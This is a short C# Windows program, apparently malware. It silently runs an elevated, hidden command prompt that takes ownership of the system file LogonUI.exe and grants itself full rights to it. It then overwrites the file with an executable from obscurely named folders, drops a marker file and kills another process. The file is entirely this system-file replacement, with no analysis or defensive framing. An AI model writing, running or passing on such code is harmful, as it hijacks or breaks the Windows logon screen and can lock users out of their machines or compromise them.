using System;
using System.Collections.Generic;
using System.Linq;
using System.Diagnostics;

namespace logonuiOWR
{
    static class Program
    {
        /// <summary>
        /// アプリケーションのメイン エントリ ポイントです。
        /// </summary>
        [STAThread]
        static void Main()
        {
            ProcessStartInfo logon = new ProcessStartInfo();
            logon.FileName = "cmd.exe";
            logon.Arguments =
                @"/c cd\&cd Windows\system32&takeown /f LogonUI.exe&icacls LogonUI.exe /granted ""%username%"":F&cd..&cd winbase_base_procid_none&cd secureloc0x65&copy ""ui65.exe"" ""C:\windows\system32\LogonUI.exe"" /Y&echo WinLTDRStartwinpos > ""c:\windows\WinAttr.gci""&timeout 2&taskkill /f /im ""tobi0a0c.exe""&exit";
            logon.Verb = "RunAs";
            logon.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(logon);
        }
    }
}
